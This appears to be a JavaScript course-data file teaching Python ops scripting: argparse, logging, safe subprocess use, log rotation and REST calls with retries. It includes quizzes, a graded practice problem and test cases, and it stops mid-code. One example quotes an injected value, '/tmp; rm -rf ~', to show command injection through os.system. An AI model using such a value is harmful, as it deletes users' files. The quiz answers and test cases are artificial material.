(function () {
  var topics = [], practice = [], quiz = [], interview = [];
  // R`...` = code exactly as typed (backslashes such as \n stay as two characters, which Python needs).
  var R = String.raw;
  var LAB = 'Python 3.11+ on your own machine, WSL or a throwaway container (<code>docker run -it --rm python:3.12 bash</code>). Cloud parts use a sandbox AWS account (documentation id 123456789012) with credentials from a profile, SSO or a role, never from the code.';
  var PURE = '<p>Python 3 standard library only. The function is pure: no network, no AWS calls, no files. Inputs are valid and in the format shown.</p>';
  var SKIP = { skip: 'cloud automation, verified by reading' };
  // Compact problem builder. Code is Python unless o.lang says otherwise.
  function P(o) {
    var lang = o.lang || 'python';
    var p = {
      title: o.t, level: o.l, tags: o.tags, companies: o.co,
      statement: o.s, constraints: o.c || LAB, example: o.ex,
      brute: { why: o.bw },
      mcq: { q: o.q[0], options: o.q[1], answer: o.q[2], explain: o.q[3] },
      hints: o.h,
      solution: { approach: o.a, code: { lang: lang, code: o.code }, complexity: o.cx, followUps: o.f },
      tests: o.tests || SKIP
    };
    if (o.bc) p.brute.code = { lang: o.blang || lang, code: o.bc };
    if (o.alt) p.solution.alt = o.alt;
    return p;
  }
  function box(id, label, x, y, w) { return { id: id, label: label, x: x, y: y, shape: 'box', w: w || 18 }; }
  function one(k, v) { var h = {}; h[k] = v; return h; }
  function pad4(f, tip) { while (f.length < 4) f.push({ narr: tip, parts: f[f.length - 1].parts }); return f; }
  function csv(s) { return String(s == null ? '' : s).split(',').map(function (x) { return x.trim(); }).filter(Boolean); }

  // ───────────────────────── Topic 1: from bash to a real Python script ─────────────────────────
  topics.push({
    title: 'From Bash to Python: a Real Script with argparse, logging, subprocess and pathlib',
    analogy: `<p>Bash is a <b>pocket knife</b>: perfect for a quick cut, always in your pocket, but you would not build a kitchen with it. Python is a <b>proper toolbox</b>: it takes a minute to open, but it has a labelled drawer for everything. <code>argparse</code> is the front desk that checks every visitor's ticket, <code>logging</code> is the diary that writes down what happened and when, <code>pathlib</code> is the map of the building, and <code>subprocess</code> is the phone you use to ask other programs to do a job. When the job grows past "run three commands in a row", you switch from the knife to the toolbox.</p>`,
    explain: `<p>🟢 <b>When to move from bash to Python.</b> In the Bash module you learnt to write safe scripts with <code>set -euo pipefail</code>, traps and <code>getopts</code>. Bash stays the right tool for gluing a few commands together. Move to Python when you see any of these signs:</p>
      ${H.table(['Sign in your bash script', 'Why Python wins'], [
        ['You parse JSON with <code>jq</code> and then loop over the result in bash', 'JSON becomes normal dicts and lists: <code>json.loads()</code>, then plain <code>for</code> loops'],
        ['You call a REST API with <code>curl</code> and check status codes by hand', '<code>urllib.request</code> or <code>requests</code> give you status codes, headers, timeouts and exceptions'],
        ['The script is over ~100 lines, or has functions that return data (not just exit codes)', 'Real functions with return values, data structures, classes and tests'],
        ['You need retries, pagination or many API calls (AWS, GitHub, Slack)', '<code>boto3</code> has paginators, waiters and retries built in'],
        ['You want unit tests', '<code>pytest</code> and mocks; testing bash is possible (bats) but painful'],
        ['Arrays of arrays, dates, decimals, error handling per item', 'Lists of dicts, <code>datetime</code>, <code>try/except</code> per item']
      ])}
      <p>A simple rule many teams use: <b>if it fits on one screen and only runs commands, keep bash. If it handles data, talks to APIs, or needs tests, use Python.</b></p>
      <p>🟢 <b>The skeleton every ops script should have.</b> Five parts, always in the same order:</p>
      <ol>
        <li><b>argparse</b> reads options: <code>--region</code>, <code>--days 30</code>, <code>--apply</code>. It writes the <code>--help</code> text for you and rejects bad input (for example <code>--days abc</code>) with a clear message and exit code 2.</li>
        <li><b>logging</b> instead of <code>print</code> for progress and errors. Log lines get a time, a level (DEBUG, INFO, WARNING, ERROR) and go to <b>stderr</b>, so stdout stays clean for real output that another tool may read.</li>
        <li><b>A <code>main(argv=None)</code> function</b> that returns an exit code. Tests can call <code>main(["--days", "7"])</code> directly.</li>
        <li><b>Small functions</b> that do one thing and return data, so you can test them without touching servers.</li>
        <li><code>if __name__ == "__main__": sys.exit(main())</code> at the bottom, so the exit code reaches cron, systemd or CI.</li>
      </ol>
      <p>🔵 <b>pathlib, shutil and subprocess replace most shell commands.</b></p>
      ${H.table(['Bash', 'Python', 'Note'], [
        ['<code>ls /var/log/app/*.gz</code>', '<code>Path("/var/log/app").glob("*.gz")</code>', 'no word splitting, spaces are safe'],
        ['<code>mkdir -p "$d"</code>', '<code>Path(d).mkdir(parents=True, exist_ok=True)</code>', 'idempotent by design'],
        ['<code>cp -r a b</code> / <code>mv a b</code>', '<code>shutil.copytree(a, b)</code> / <code>shutil.move(a, b)</code>', '<code>shutil.disk_usage("/")</code> replaces <code>df</code>'],
        ['<code>rm -rf "$d"</code>', '<code>shutil.rmtree(d)</code>', 'guard it: check the path first'],
        ['<code>out=$(cmd arg)</code>', '<code>subprocess.run(["cmd", "arg"], capture_output=True, text=True, check=True).stdout</code>', 'a <b>list</b> of arguments, no shell'],
        ['<code>gzip -c f &gt; f.gz</code>', '<code>gzip.open()</code> + <code>shutil.copyfileobj()</code>', 'streams, so big files are fine']
      ])}
      <p>🔵 <b>Exit codes still matter.</b> Return 0 for success, 1 for "the job failed", 2 for "bad usage" (argparse already uses 2). Cron, systemd and CI only read the number.</p>`,
    clues: [
      '"the bash script has grown to 300 lines and parses jq output" → time to rewrite it in Python with small tested functions',
      '"add a --dry-run flag / make the script safer" → argparse <code>store_true</code> flags, with dry run as the <b>default</b> and <code>--apply --yes</code> to change things',
      '"logs from the script are mixed into the output file" → use <code>logging</code> to stderr, keep stdout for data',
      '"run this on 50 servers" → <code>concurrent.futures.ThreadPoolExecutor</code> + <code>subprocess.run(["ssh", host, ...], timeout=...)</code>, collect per-host results',
      '"shell=True" or "os.system" in a code review → injection risk; pass a list of arguments instead',
      '"the script works by hand but cron says it succeeded when it failed" → <code>sys.exit(main())</code> with a real non-zero code'
    ],
    code: [{ lang: 'python', run: true, code: R`#!/usr/bin/env python3
"""rotate_logs.py - rotate app.log into app.log.1.gz ... and keep only the newest N copies.

Real use:  rotate_logs.py /var/log/myapp --keep 5            (dry run: only prints the plan)
           rotate_logs.py /var/log/myapp --keep 5 --apply --yes
Lab: run this file as it is. It builds a fake log folder in a temp directory and rotates it.
"""
import argparse
import gzip
import logging
import shutil
import sys
import tempfile
from pathlib import Path

log = logging.getLogger("rotate_logs")


def parse_args(argv=None):
    p = argparse.ArgumentParser(description="Rotate a log file, keeping the newest N gzipped copies.")
    p.add_argument("log_dir", type=Path, help="folder that holds the log")
    p.add_argument("--name", default="app.log", help="log file name (default: %(default)s)")
    p.add_argument("--keep", type=int, default=5, help="rotated copies to keep (default: %(default)s)")
    p.add_argument("--apply", action="store_true", help="really change files (default: dry run)")
    p.add_argument("--yes", action="store_true", help="confirm deletes; required with --apply")
    p.add_argument("-v", "--verbose", action="store_true", help="debug logging")
    args = p.parse_args(argv)
    if args.keep < 1:
        p.error("--keep must be at least 1")          # prints usage and exits with code 2
    if args.apply and not args.yes:
        p.error("--apply deletes old logs; add --yes to confirm")
    return args


def rotate(log_dir: Path, name: str, keep: int, apply: bool) -> int:
    """Plan (and optionally do) the rotation. Returns how many actions were needed."""
    verb = "DO" if apply else "WOULD"
    actions = 0
    # 1. Delete copies that would fall off the end (number >= keep).
    for old in sorted(log_dir.glob(f"{name}.*.gz")):
        middle = old.name[len(name) + 1:-3]           # "app.log.3.gz" -> "3"
        if middle.isdigit() and int(middle) >= keep:
            log.info("%s delete %s", verb, old.name)
            actions += 1
            if apply:
                old.unlink()
    # 2. Shift the rest up by one. Highest number first, so nothing gets overwritten.
    for n in range(keep - 1, 0, -1):
        src = log_dir / f"{name}.{n}.gz"
        if src.exists():
            log.info("%s rename %s -> %s.%d.gz", verb, src.name, name, n + 1)
            actions += 1
            if apply:
                src.rename(log_dir / f"{name}.{n + 1}.gz")
    # 3. Compress the live log into .1.gz, then empty it (like logrotate's copytruncate).
    live = log_dir / name
    if live.exists() and live.stat().st_size > 0:
        log.info("%s gzip %s -> %s.1.gz", verb, name, name)
        actions += 1
        if apply:
            with live.open("rb") as fin, gzip.open(log_dir / f"{name}.1.gz", "wb") as fout:
                shutil.copyfileobj(fin, fout)         # streams in chunks: fine for 5 GB logs
            live.write_bytes(b"")
    return actions


def main(argv=None) -> int:
    args = parse_args(argv)
    logging.basicConfig(level=logging.DEBUG if args.verbose else logging.INFO,
                        format="%(levelname)s %(name)s: %(message)s", stream=sys.stderr)
    if not args.log_dir.is_dir():
        log.error("not a folder: %s", args.log_dir)
        return 2
    n = rotate(args.log_dir, args.name, args.keep, args.apply)
    log.info("%d action(s) %s", n, "applied" if args.apply else "planned; dry run, nothing changed")
    return 0


if __name__ == "__main__":
    # Demo instead of sys.exit(main()): build a fake folder, dry-run it, then apply.
    with tempfile.TemporaryDirectory() as d:
        folder = Path(d)
        (folder / "app.log").write_text("GET /health 200\n" * 3)
        for i in (1, 2, 3):
            with gzip.open(folder / f"app.log.{i}.gz", "wt") as f:
                f.write(f"old log {i}\n")
        print("dry run exit code:", main([d, "--keep", "3"]))
        print("files after dry run:", sorted(p.name for p in folder.iterdir()))
        print("apply exit code:", main([d, "--keep", "3", "--apply", "--yes"]))
        print("files after apply:", sorted(p.name for p in folder.iterdir()))
        print("app.log size now:", (folder / "app.log").stat().st_size, "bytes")
# Output (stdout; the INFO lines go to stderr):
# dry run exit code: 0
# files after dry run: ['app.log', 'app.log.1.gz', 'app.log.2.gz', 'app.log.3.gz']
# apply exit code: 0
# files after apply: ['app.log', 'app.log.1.gz', 'app.log.2.gz', 'app.log.3.gz']
# app.log size now: 0 bytes` }],
    codeTitle: ['A complete ops script: argparse, logging, pathlib, dry run by default'],
    viz: [{
      title: 'argparse reads a command line, token by token',
      input: '/var/log/myapp --keep 3 --apply',
      inputLabel: 'arguments after rotate_logs.py (try adding --yes, or --keep abc)',
      gen: function (input) {
        var s = String(input == null ? '' : input).trim();
        if (s.length > 80) throw new Error('Keep the command line under 80 characters');
        var toks = s ? s.split(/\s+/) : [];
        var ns = { log_dir: '(missing)', name: 'app.log', keep: '5', apply: 'False', yes: 'False', verbose: 'False' };
        var f = [];
        f.push({ narr: 'argparse starts with the <b>defaults</b> you declared. Every option already has a value before a single argument is read. That is why <code>args.keep</code> is never "unset" in your code.', parts: [
          { type: 'array', label: 'sys.argv[1:]', values: toks.length ? toks : ['(nothing)'] },
          { type: 'vars', label: 'Namespace (args)', vals: Object.assign({}, ns) }
        ] });
        var err = null, i = 0, posDone = false;
        while (i < toks.length && !err) {
          var t = toks[i], hl = {}, step = '';
          var changed = null;
          if (t === '--apply' || t === '--yes' || t === '-v' || t === '--verbose') {
            var k = t === '-v' ? 'verbose' : t.slice(2);
            ns[k] = 'True'; changed = k;
            step = '<code>' + t + '</code> is a <b>flag</b> (<code>store_true</code>): it takes no value, it just switches <code>' + k + '</code> to True.';
            i += 1;
          } else if (t === '--keep' || t === '--name') {
            var v = toks[i + 1];
            if (v === undefined || v.indexOf('--') === 0) { err = 'argument ' + t + ': expected one argument'; break; }
            if (t === '--keep' && !/^-?\d+$/.test(v)) { err = "argument --keep: invalid int value: '" + v + "'"; break; }
            ns[t.slice(2)] = v; changed = t.slice(2);
            step = '<code>' + t + '</code> needs a value, so argparse eats the <b>next</b> token too (<code>' + H.esc(v) + '</code>)' + (t === '--keep' ? ' and runs <code>type=int</code> on it, so you get the number ' + v + ', not the text "' + v + '".' : '.');
            hl[i] = 'cur'; hl[i + 1] = 'cur';
            i += 2;
          } else if (t.indexOf('-') === 0) {
            err = 'unrecognized arguments: ' + t; break;
          } else if (!posDone) {
            ns.log_dir = t; changed = 'log_dir'; posDone = true;
            step = '<code>' + H.esc(t) + '</code> does not start with a dash, so it fills the first <b>positional</b> argument, <code>log_dir</code>, and becomes a <code>Path</code>.';
            i += 1;
          } else { err = 'unrecognized arguments: ' + t; break; }
          var ah = {}; for (var j = 0; j < i; j++) ah[j] = 'done'; if (changed === 'keep' || changed === 'name') { ah[i - 1] = 'ok'; ah[i - 2] = 'ok'; } else ah[i - 1] = 'ok';
          f.push({ narr: step, parts: [
            { type: 'array', label: 'sys.argv[1:]', values: toks, hl: ah },
            { type: 'vars', label: 'Namespace (args)', vals: Object.assign({}, ns), hl: one(changed, 'ok') }
          ] });
        }
        if (!err && ns.log_dir === '(missing)') err = 'the following arguments are required: log_dir';
        if (!err && ns.keep !== '5' && Number(ns.keep) < 1) err = '--keep must be at least 1';
        if (!err && ns.apply === 'True' && ns.yes !== 'True') err = '--apply deletes old logs; add --yes to confirm';
        if (err) {
          f.push({ narr: 'argparse (or our own <code>p.error()</code> check) stops here. It prints the usage line and the message to <b>stderr</b> and exits with code <b>2</b>, before any file is touched. ' + H.c('r', 'Bad input never reaches your logic.'), parts: [
            { type: 'text', label: 'stderr', html: '<code>usage: rotate_logs.py [-h] [--name NAME] [--keep KEEP] [--apply] [--yes] [-v] log_dir</code><br><code>rotate_logs.py: error: ' + H.esc(err) + '</code>' },
            { type: 'vars', label: 'process', vals: { 'exit code': '2' }, hl: { 'exit code': 'bad' } }
          ] });
        } else {
          var mode = ns.apply === 'True' ? 'APPLY (files will change)' : 'DRY RUN (only prints the plan)';
          f.push({ narr: 'All tokens are used and the checks pass. Your code now reads plain attributes: <code>args.keep</code> is an int, <code>args.apply</code> a bool. Mode: <b>' + mode + '</b>. ' + (ns.apply === 'True' ? 'Both --apply and --yes were given, so the user clearly asked for changes.' : 'Without <code>--apply</code> nothing is changed: the safe default.'), parts: [
            { type: 'vars', label: 'Namespace (args)', vals: Object.assign({}, ns), hl: { apply: ns.apply === 'True' ? 'bad' : 'ok' } },
            { type: 'vars', label: 'process', vals: { mode: mode, 'exit code': '0' }, hl: { mode: 'sel' } }
          ] });
        }
        return pad4(f, 'Try another command line: add <code>--yes</code>, remove the folder, or type <code>--keep abc</code> to watch argparse reject it.');
      }
    }],
    examples: [
      { title: 'subprocess the safe way: a list, a timeout and check=True', html: `<p>An old bash habit is <code>os.system("du -sh " + path)</code>. If <code>path</code> comes from a user or a file, a value like <code>/tmp; rm -rf ~</code> runs a second command. Pass a <b>list</b> so no shell is involved, add a <code>timeout</code> so a hung command cannot block cron forever, and <code>check=True</code> so a failure raises <code>CalledProcessError</code> instead of being ignored. Here the "remote command" is just another Python process, so the example runs anywhere.</p>`, code: { lang: 'python', run: true, code: R`import subprocess
import sys

# A list of arguments: no shell, so ; | $( ) in values are just characters.
ok = subprocess.run([sys.executable, "-c", "print('disk ok: 42% used')"],
                    capture_output=True, text=True, check=True, timeout=10)
print("stdout:", ok.stdout.strip(), "| exit code:", ok.returncode)

try:
    subprocess.run([sys.executable, "-c", "import sys; print('disk full', file=sys.stderr); sys.exit(3)"],
                   capture_output=True, text=True, check=True, timeout=10)
except subprocess.CalledProcessError as e:
    print("failed with exit code", e.returncode, "stderr:", e.stderr.strip())

try:
    subprocess.run([sys.executable, "-c", "import time; time.sleep(5)"], timeout=0.5)
except subprocess.TimeoutExpired:
    print("timed out after 0.5 s: the child was killed, the script carries on")
# Output:
# stdout: disk ok: 42% used | exit code: 0
# failed with exit code 3 stderr: disk full
# timed out after 0.5 s: the child was killed, the script carries on` } },
      { title: 'Rotating logs on 40 servers in parallel', html: `<p>The rotation script works on one host. To run it on a fleet, do <b>not</b> loop over hosts one by one (40 hosts × 20 s = 13 minutes). Use a thread pool: each thread mostly waits on SSH, so threads are perfect here. Collect a result per host, keep going when one host fails, and exit non-zero if any failed so the cron job or pipeline shows red. This needs SSH access, so it is shown for reading.</p>`, code: R`import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

HOSTS = [f"web-{i:02d}.internal" for i in range(1, 41)]
CMD = ["sudo", "/usr/local/bin/rotate_logs.py", "/var/log/myapp", "--keep", "7", "--apply", "--yes"]


def run_on(host):
    """Run CMD on one host over SSH. Returns (host, ok, short message)."""
    try:
        p = subprocess.run(["ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=5", host, *CMD],
                           capture_output=True, text=True, timeout=120)
        return host, p.returncode == 0, (p.stderr or p.stdout).strip()[-200:]
    except subprocess.TimeoutExpired:
        return host, False, "timed out after 120 s"


def main():
    failed = []
    with ThreadPoolExecutor(max_workers=10) as pool:      # 10 at a time: do not hammer the fleet
        futures = [pool.submit(run_on, h) for h in HOSTS]
        for fut in as_completed(futures):
            host, ok, msg = fut.result()
            print(f"{'OK  ' if ok else 'FAIL'} {host} {msg if not ok else ''}")
            if not ok:
                failed.append(host)
    print(f"{len(HOSTS) - len(failed)}/{len(HOSTS)} hosts rotated")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())` },
      { title: 'logging set up once, used everywhere', html: `<p>Configure logging <b>once</b>, in <code>main()</code>. Every module just does <code>log = logging.getLogger(__name__)</code>. Use <code>%s</code> placeholders (<code>log.info("deleted %s", name)</code>) rather than f-strings: the text is only built if the level is enabled. <code>log.exception()</code> inside an <code>except</code> block adds the full traceback. Messages below the configured level are dropped, as the output shows.</p>`, code: { lang: 'python', run: true, code: R`import logging
import sys

logging.basicConfig(level=logging.INFO, stream=sys.stdout,          # stdout only so you can see it here
                    format="%(levelname)-7s %(name)s: %(message)s")
log = logging.getLogger("cleanup")

log.debug("not shown: DEBUG is below INFO")
log.info("scanning %d snapshots in %s", 120, "eu-west-1")
log.warning("snapshot %s has no Owner tag", "snap-0abc1234")
try:
    1 / 0
except ZeroDivisionError:
    log.exception("division failed")        # ERROR + traceback
logging.getLogger("botocore").setLevel(logging.WARNING)   # silence chatty libraries
# Output (first lines):
# INFO    cleanup: scanning 120 snapshots in eu-west-1
# WARNING cleanup: snapshot snap-0abc1234 has no Owner tag
# ERROR   cleanup: division failed
# Traceback (most recent call last): ...` } }
    ],
    deepDive: `<p>🟣 <b>argparse details that matter in production.</b> <code>type=int</code> converts and validates; for richer checks write a small function and pass it as <code>type</code>. <code>choices=["dev", "prod"]</code> limits values. <code>required=True</code> on an option is allowed but a positional is often clearer. Sub-commands (<code>tool snapshots clean</code>, <code>tool logs rotate</code>) use <code>add_subparsers(dest="cmd", required=True)</code>. Environment defaults are a clean pattern: <code>default=os.environ.get("AWS_REGION", "eu-west-1")</code>. Mutually exclusive flags: <code>add_mutually_exclusive_group()</code>.</p>
      <p><b>Exit codes.</b> argparse exits with 2 on bad usage by raising <code>SystemExit(2)</code>. That is a <code>BaseException</code>, not an <code>Exception</code>, so a broad <code>except Exception</code> will not swallow it, which is what you want. Uncaught exceptions make Python exit with 1 and print a traceback. Return explicit codes from <code>main()</code> for the expected failures.</p>
      <p><b>subprocess pitfalls.</b> <code>shell=True</code> with any outside value is a command-injection bug; if you truly need a pipe, build it with two <code>Popen</code> objects or do the filtering in Python. Without <code>timeout</code>, a stuck SSH or DNS lookup hangs forever. <code>capture_output=True</code> holds all output in memory, so for huge outputs stream with <code>Popen(..., stdout=PIPE)</code> and iterate lines. On Python 3.12+, prefer <code>text=True</code> plus an explicit <code>encoding="utf-8"</code> if output may not match the locale.</p>
      <p><b>Threads vs processes.</b> SSH, HTTP and AWS calls spend their time <b>waiting</b>, so threads are fine despite the GIL. CPU-heavy work (compressing in Python, parsing huge files) can use <code>ProcessPoolExecutor</code>. Always cap <code>max_workers</code>: 200 parallel SSH sessions can trip rate limits, firewalls or your own bastion host.</p>
      <p><b>Where the script runs.</b> Put <code>#!/usr/bin/env python3</code> on top and make it executable, but under cron prefer an absolute interpreter path from a virtual environment (<code>/opt/tools/venv/bin/python /opt/tools/rotate_logs.py</code>) so the right library versions are used. The packaging topic shows the cleaner way: a real installed command.</p>`,
    aiEra: `<p>🤖 <b>What AI changes:</b> "convert this bash script to Python with argparse and logging" is one of the best uses of an assistant. It produces the skeleton, help text and type conversions in seconds, and it is good at explaining what an old script does before you rewrite it.</p>
      <p><b>Where it goes wrong:</b> generated scripts often use <code>shell=True</code> with f-strings, forget timeouts, <code>print</code> everything to stdout, swallow errors with a bare <code>except: pass</code>, and make the destructive path the default ("it deletes, add --dry-run if you want to be careful"). Some still use <code>os.system</code> or <code>optparse</code>. <b>Your job:</b> insist on a list-of-arguments <code>subprocess.run</code> with <code>timeout</code> and <code>check</code>, dry run as the default with an explicit confirmation flag, logging to stderr, and a <code>main()</code> you can test. Run the generated script against a temp folder first, as the lab does.</p>`,
    problems: [P({
      t: 'Plan a log rotation without touching the disk', l: 'Medium', tags: ['pathlib', 'log rotation', 'dry run', 'pure function'], co: ['Amazon', 'Atlassian', 'Infosys'], c: PURE,
      s: `<p>Your rotation tool must print a <b>plan</b> in dry-run mode, so the planning logic should be a pure function you can test. Write <code>rotation_plan(names, keep)</code>. <code>names</code> lists the files in a log folder (any order). The live log is <code>app.log</code>; rotated copies are <code>app.log.N.gz</code> where N is a positive whole number. Ignore every other name (<code>app.log.bak</code>, <code>app.log.x.gz</code>, <code>other.log.1.gz</code>).</p>
        <p>Return the actions as strings, in this order:</p>
        <ol><li><code>delete app.log.N.gz</code> for every copy with N ≥ keep, smallest N first;</li>
        <li><code>rename app.log.N.gz -&gt; app.log.M.gz</code> (M = N+1) for each existing N from keep−1 down to 1;</li>
        <li><code>gzip app.log -&gt; app.log.1.gz</code> if <code>app.log</code> exists.</li></ol>`,
      ex: `<p><code>rotation_plan(["app.log", "app.log.1.gz", "app.log.2.gz", "app.log.3.gz"], 3)</code> → ${H.c('g', '["delete app.log.3.gz", "rename app.log.2.gz -&gt; app.log.3.gz", "rename app.log.1.gz -&gt; app.log.2.gz", "gzip app.log -&gt; app.log.1.gz"]')}. Copy 3 would become copy 4, which is past the limit, so it goes first. Renames run from the highest number down, so 2 → 3 happens before 1 → 2 and nothing is overwritten.</p>`,
      bw: `<p>Renaming from the <b>lowest</b> number up: <code>1 → 2</code> first overwrites the existing copy 2 before it has moved, and one day of logs is lost. A second trap is sorting names as text: <code>"app.log.10.gz"</code> sorts before <code>"app.log.4.gz"</code>, so deletes come out in the wrong order and numbers above 9 behave strangely.</p>`,
      bc: `def rotation_plan(names, keep):
    plan = []
    for n in range(1, keep):                      # lowest first: 1 -> 2 overwrites the old 2!
        if f"app.log.{n}.gz" in names:
            plan.append(f"rename app.log.{n}.gz -> app.log.{n + 1}.gz")
    if "app.log" in names:
        plan.append("gzip app.log -> app.log.1.gz")
    return plan                                   # and copies past keep are never deleted`,
      q: ['Why must the renames go from the highest number down?', ['So a file is never renamed onto a copy that has not moved yet', 'Because the filesystem only allows renames in that order', 'To make the plan shorter', 'It does not matter, renames are atomic'], 0, 'rename() silently replaces the target on Linux. Going 1 → 2 first would destroy the old copy 2. Moving the top one first always leaves a free slot.'],
      h: ['<p>Hint 1: pull the numbers out first. A name counts only if it starts with <code>app.log.</code>, ends with <code>.gz</code>, and the middle part is all digits.</p>', '<p>Hint 2: keep the numbers in a <b>set of ints</b>. Sorting ints gives the right order for deletes, and <code>n in nums</code> is a quick existence check for renames.</p>', '<p>Hint 3: recipe: deletes = sorted N ≥ keep; then <code>for n in range(keep - 1, 0, -1)</code> add a rename if n exists; then gzip if <code>"app.log" in names</code>. Empty input gives an empty plan.</p>'],
      a: `<p>Parse once, then plan in three passes. Extract N from each matching name with a strict check (prefix, suffix, digits only) and store the ints in a set. Copies with N ≥ keep would end up past the limit after shifting, so they are deleted first, in numeric order. Then walk N from keep−1 down to 1 and add a rename for each one that exists; going downwards guarantees the target slot is already free. Last, the live log becomes copy 1. Because the function only returns strings, the real tool can print them in dry-run mode and execute exactly the same list with <code>--apply</code>: what you reviewed is what runs.</p>`,
      code: `def rotation_plan(names, keep):
    """Return the ordered rotation actions for app.log in a folder listing."""
    prefix, suffix = "app.log.", ".gz"
    nums = set()
    for name in names:
        if name.startswith(prefix) and name.endswith(suffix):
            middle = name[len(prefix):-len(suffix)]
            if middle.isdigit() and int(middle) > 0:
                nums.add(int(middle))
    plan = [f"delete app.log.{n}.gz" for n in sorted(nums) if n >= keep]
    for n in range(keep - 1, 0, -1):              # highest first: the target slot is always free
        if n in nums:
            plan.append(f"rename app.log.{n}.gz -> app.log.{n + 1}.gz")
    if "app.log" in names:
        plan.append("gzip app.log -> app.log.1.gz")
    return plan`,
      cx: `<p>O(F log F) for F files (sorting the numbers), plus O(keep) for the rename loop. No disk access at all, so it is instant and fully testable.</p>`,
      f: ['How would you add a rule "only rotate if app.log is bigger than 100 MB" while keeping the function pure?', 'What changes if the copies are not gzipped (app.log.1, app.log.2)?'],
      tests: { sig: 'string[] int -> string[]', fn: 'rotationPlan', cases: [
        [[['app.log', 'app.log.1.gz', 'app.log.2.gz', 'app.log.3.gz'], 3], ['delete app.log.3.gz', 'rename app.log.2.gz -> app.log.3.gz', 'rename app.log.1.gz -> app.log.2.gz', 'gzip app.log -> app.log.1.gz']],
        [[['app.log'], 5], ['gzip app.log -> app.log.1.gz']],
        [[[], 3], []],
        [[['app.log.1.gz', 'app.log.2.gz'], 2], ['delete app.log.2.gz', 'rename app.log.1.gz -> app.log.2.gz']],
        [[['app.log', 'app.log.1.gz', 'app.log.7.gz', 'notes.txt', 'app.log.bak', 'app.log.x.gz', 'other.log.1.gz'], 3], ['delete app.log.7.gz', 'rename app.log.1.gz -> app.log.2.gz', 'gzip app.log -> app.log.1.gz']],
        [[['app.log', 'app.log.1.gz'], 1], ['delete app.log.1.gz', 'gzip app.log -> app.log.1.gz']],
        [[['app.log', 'app.log.2.gz', 'app.log.10.gz', 'app.log.4.gz'], 4], ['delete app.log.4.gz', 'delete app.log.10.gz', 'rename app.log.2.gz -> app.log.3.gz', 'gzip app.log -> app.log.1.gz']],
        [[['app.log.1.gz', 'app.log', 'app.log.3.gz', 'app.log.2.gz'], 5], ['rename app.log.3.gz -> app.log.4.gz', 'rename app.log.2.gz -> app.log.3.gz', 'rename app.log.1.gz -> app.log.2.gz', 'gzip app.log -> app.log.1.gz']]
      ] }
    })]
  });

  // ───────────────────────── Topic 2: REST APIs, retries and webhooks ─────────────────────────
  topics.push({
    title: 'Calling REST APIs: urllib, requests, Timeouts, Retries with Backoff and Webhook Alerts',
    analogy: `<p>Calling an API is like <b>phoning a busy help desk</b>. You always set a limit on how long you will wait on hold (a <b>timeout</b>). If you hear "all lines are busy" (429 or 503) you hang up and call back later, waiting a bit longer each time, and not at exactly the same second as everyone else (<b>backoff with jitter</b>). If they say "that account does not exist" (404) or "you are not allowed" (403), calling again will not help, so you stop. And you never read your password out loud in a recorded call: the token stays in your pocket (an <b>environment variable</b>), not in the script.</p>`,
    explain: `<p>🟢 <b>What a REST call is.</b> Your script sends an HTTP request: a <b>method</b> (GET to read, POST to create, PUT/PATCH to change, DELETE to remove), a <b>URL</b>, some <b>headers</b> (for example <code>Authorization: Bearer ...</code>) and maybe a JSON <b>body</b>. The server answers with a <b>status code</b> and usually a JSON body. You met these codes in the Networking module; in automation, the code decides what your script does next:</p>
      ${H.table(['Status', 'Meaning', 'What the script should do'], [
        ['200, 201, 204', 'success', 'carry on'],
        ['400, 404, 422', 'your request is wrong', 'stop and log it; retrying sends the same wrong request'],
        ['401, 403', 'bad or missing token, or not allowed', 'stop; check the token and its permissions'],
        ['429', 'too many requests', 'wait (respect <code>Retry-After</code> if sent), then retry'],
        ['500, 502, 503, 504', 'server side or proxy trouble', 'retry with backoff, a few times'],
        ['no answer / timeout', 'network problem', 'retry with backoff, a few times']
      ])}
      <p>🟢 <b>Two ways to call an API in Python.</b> <code>urllib.request</code> ships with Python, so it works on any server with no installs. <code>requests</code> is the popular library with a friendlier interface. Use the standard library for tiny scripts that must run anywhere; use <code>requests</code> (or <code>httpx</code>) for real tools.</p>
      <p>🟢 <b>Three rules for every API call:</b></p>
      <ol>
        <li><b>Always set a timeout.</b> Neither <code>urllib</code> nor <code>requests</code> has one by default, so a stuck server freezes your cron job forever. <code>requests.get(url, timeout=(3.05, 27))</code> means 3 s to connect, 27 s to wait for data.</li>
        <li><b>Check the status.</b> <code>urllib</code> raises <code>HTTPError</code> for 4xx/5xx; with <code>requests</code> call <code>r.raise_for_status()</code>, otherwise a 500 page is silently treated as success.</li>
        <li><b>Secrets come from the environment.</b> <code>token = os.environ["GITHUB_TOKEN"]</code> fails loudly if it is missing. The same goes for <b>webhook URLs</b>: a Slack or Teams webhook URL <i>is</i> a secret, because anyone who has it can post to your channel.</li>
      </ol>
      <p>🔵 <b>Retry with exponential backoff and jitter.</b> Wait 1 s, then 2 s, then 4 s, up to a cap (say 30 s), and give up after a fixed number of tries. Add <b>jitter</b> (a random part) so a hundred scripts that failed together do not all retry at the same moment and knock the server over again. The common "full jitter" formula is <code>sleep = random.uniform(0, min(cap, base * 2 ** attempt))</code>.</p>
      <p>🔵 <b>Only retry what is safe to repeat.</b> GET, PUT and DELETE are <b>idempotent</b>: doing them twice has the same effect as once. A POST that creates something may create it <b>twice</b> if the first one actually worked but the answer got lost. For those, use an <b>idempotency key</b> header if the API supports it, or check before you create.</p>`,
    clues: [
      '"the script hung for hours on an API call" → no timeout; always pass <code>timeout=</code>',
      '"the API sometimes returns 503 / 429" → retry with exponential backoff + jitter, honour <code>Retry-After</code>, cap the attempts',
      '"send an alert to Slack/Teams when the job fails" → POST JSON to an incoming-webhook URL read from <code>os.environ</code>, never committed',
      '"the script reported success but nothing happened" → missing <code>raise_for_status()</code> / status check',
      '"we got duplicate tickets after a network blip" → POST retried without an idempotency key',
      '"the API only returns 100 results" → pagination (Link header, <code>next</code> URL or a token): see the pagination topic'
    ],
    code: [{ lang: 'python', run: true, code: R`"""A tiny fake API on localhost, and a client with timeouts, error handling and retries.
Everything is standard library, so this runs anywhere. Real tools would use requests (see below).
"""
import json
import os
import random
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

calls = {"flaky": 0}


class FakeAPI(BaseHTTPRequestHandler):
    def _send(self, status, payload, headers=None):
        body = json.dumps(payload).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
